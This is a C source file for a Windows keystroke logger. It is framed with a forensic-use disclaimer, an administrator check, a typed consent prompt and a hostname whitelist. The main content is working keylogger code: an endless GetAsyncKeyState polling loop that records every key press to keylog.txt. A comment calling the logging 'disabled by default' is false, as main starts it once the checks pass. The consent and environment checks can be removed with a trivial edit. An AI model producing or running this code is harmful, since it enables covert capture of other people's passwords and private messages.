#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>
#include <io.h>

#define LOG_FILE "forensic_log.txt"
#define CONSENT_FILE "consent_log.txt"

// ⚠️ LEGAL DISCLAIMER:
// This tool is strictly for **authorized forensic analysis** and **cybersecurity research** in controlled environments.
// Unauthorized use, distribution, or deployment may be ILLEGAL and could lead to criminal prosecution.
//
// 🚨 **Do NOT use this tool unless you have explicit written consent from the system owner.**
//
// ✔️ This tool will only run if:
//     - You are an administrator.
//     - You provide explicit confirmation.
//     - The execution environment is verified as a **safe, authorized system**.
//
// The author is **NOT responsible** for any misuse, unauthorized access, or legal consequences.

// Global variables for consent and logging
int consentGiven = 0;
FILE *logFile = NULL;

// Function to log forensic actions
void logAction(const char *message) {
    FILE *log = fopen(LOG_FILE, "a+");
    if (log != NULL) {
        time_t now;
        time(&now);
        fprintf(log, "[%s] %s\n", ctime(&now), message);
        fclose(log);
    }
}

// Function to check if the user has administrative privileges
int isAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    return isAdmin;
}

// Function to obtain explicit user consent
void getUserConsent() {
    char input[4];
    printf("⚠️ This program records keystrokes **only for forensic analysis** in authorized environments.\n");
    printf("❌ Unauthorized use may be illegal.\n");
    printf("Do you have **written consent** to proceed? Type 'YES' to continue: ");
    scanf("%3s", input);

    if (strcmp(input, "YES") != 0) {
        printf("Consent **NOT** given. Exiting...\n");
        logAction("[!] User denied consent. Program terminated.");
        exit(1);
    }

    consentGiven = 1;

    // Log consent for accountability
    FILE *consentLog = fopen(CONSENT_FILE, "a+");
    if (consentLog != NULL) {
        time_t now;
        time(&now);
        fprintf(consentLog, "Consent granted on: %s", ctime(&now));
        fclose(consentLog);
    }

    logAction("[+] User provided explicit consent.");
}

// Function to check execution environment and ensure safe usage
void checkExecutionEnvironment() {
    char hostname[MAX_PATH];
    gethostname(hostname, sizeof(hostname));

    // Example: Only allow execution on a pre-approved machine (Modify accordingly)
    if (strstr(hostname, "trusted_system") == NULL) {
        printf("❌ This program is **not** running in an authorized environment. Exiting...\n");
        logAction("[!] Unauthorized execution attempt detected.");
        exit(1);
    }

    logAction("[+] Execution environment verified.");
}

// Function to log keystrokes (DISABLED BY DEFAULT)
void logKey(int key) {
    if (logFile == NULL) {
        logFile = fopen("keylog.txt", "a+");
        if (!logFile) {
            printf("❌ Failed to open log file. Exiting...\n");
            logAction("[!] Keylog file access failure.");
            exit(1);
        }
    }

    // Log key presses safely, maintaining transparency
    if (key == VK_RETURN) fprintf(logFile, "[ENTER]");
    else if (key == VK_BACK) fprintf(logFile, "[BACKSPACE]");
    else if (key == VK_TAB) fprintf(logFile, "[TAB]");
    else if (key == VK_ESCAPE) fprintf(logFile, "[ESCAPE]");
    else if (key == VK_SPACE) fprintf(logFile, " ");
    else if (key >= 32 && key <= 126) fprintf(logFile, "%c", key);
    else fprintf(logFile, "[%d]", key);

    fflush(logFile);
}

// Main function
int main() {
    // Ensure administrative privileges
    if (!isAdmin()) {
        printf("❌ This tool requires **Administrator privileges**. Please run as Administrator.\n");
        logAction("[!] Attempted execution without admin rights.");
        return 1;
    }

    // Obtain user consent
    getUserConsent();

    // Validate execution environment
    checkExecutionEnvironment();

    if (consentGiven) {
        printf("✅ Keystroke logging **STARTED** in a controlled environment.\n");
        printf("🚨 **Transparency Notice:** This window will remain open to indicate active monitoring.\n");
        logAction("[+] Keystroke logging started.");

        while (1) {
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x8000) {
                    logKey(key);
                    Sleep(10);
                }
            }
        }

        fclose(logFile);
    }

    return 0;
}